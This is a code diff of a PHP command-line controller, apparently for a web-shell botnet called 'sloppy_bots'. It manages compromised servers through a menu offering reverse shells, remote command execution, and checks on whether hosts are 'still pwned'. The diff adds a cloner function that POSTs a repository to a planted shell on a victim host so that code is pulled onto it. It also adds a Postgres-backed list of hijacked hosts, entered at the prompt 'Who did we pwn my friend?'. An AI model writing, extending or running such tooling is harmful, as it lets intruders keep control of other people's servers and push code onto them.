@@ -1,4 +1,5 @@
 <?php
+require "includes/db/postgres_checker.php";
 $cof = array(
     "useragent"=> "sp1.1",
     "host"=>"127.0.0.1",
@@ -7,7 +8,7 @@ $cof = array(
     "password"=>"",
     "dbname"=>"sloppy_bots"
     );
-is_file("sloppy_config.conf") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
+is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
 define("CHH", curl_init());
 define("UAGENT", curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']));
 
@@ -31,7 +32,7 @@ function menu($clear)
         (R)everse shell                                                             
         (C)ommand Execution                                                         
         (CL)oner                                                                    
-        (U)pdates                                                                   
+        (U)pdates  -> not implemented yet.                                                                 
         (A)dd new host                                                              
         (CH)eck if hosts are still pwned                                            
         (M)ain menu                                                                 
@@ -114,19 +115,57 @@ function co($command, $host, $uri)
     return 0;
 }
 
-function clo($host, $repo)
+function clo($host, $repo, $uri)
 {
+    if (!empty($host) && !empty($repo) && !empty($uri)){
+        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
+        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
+        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
+        curl_setopt(CHH, CURLOPT_POST,                              true);
+        curl_setopt(CHH,CURLOPT_POSTFIELDS,                "clone=$repo");
+        $re = curl_exec(CHH);
+        if (!curl_errno(CHH)){
+            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)){
+                case 200:
+                    return $re;
+                default:
+                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
+            }
+        }else{
+            return 0;
+        }
+    }else{
+        return 0;
+    }
 
 }
 
 function up()
 {
 
+
 }
 
-function aHo($host, $db)
+function aHo($host)
 {
-
+    if (!empty($host)){
+        if (postgres_checker::insertHost($host) != 0){
+            echo "Successfully added: $host";
+        }else{
+            echo "There was an error. Double checking the database.";
+            if (!postgres_checker::checkDB()){
+                echo "There is a sevre error in the db, you need to ensure you have it crated.";
+                echo "Attempting to re-create or create the DB.";
+                if (postgres_checker::createDB()){
+                    echo "Created the db successfully! Please re run this command to insert the new host.";
+                }
+            }else{
+                echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
+                postgres_checker::getRecord($host);
+            }
+        }
+    }
 }
 
 function check($host, $path)
@@ -211,13 +250,24 @@ while ($run) {
             }
             break;
         case "cl":
-            echo "cl\n";
+            try{
+                $h = readline("Which host are we interacting with?\n->");
+                $rep = readline("Repo to clone?\n->");
+                clo($h, $rep, queryDB($h, "cl"));
+            }catch (Exception $e){
+                echo $e."\n";
+            }
             break;
         case "u":
-            echo "u\n";
+            echo "Will be in future editions.\n";
             break;
         case "a":
-            echo "a\n";
+            try{
+                $h = readline("Who did we pwn my friend?\n->");
+                aHo($h);
+            }catch (Exception $e){
+                echo $e."\n";
+            }
             break;
         case "ch":
             echo "ch\n";
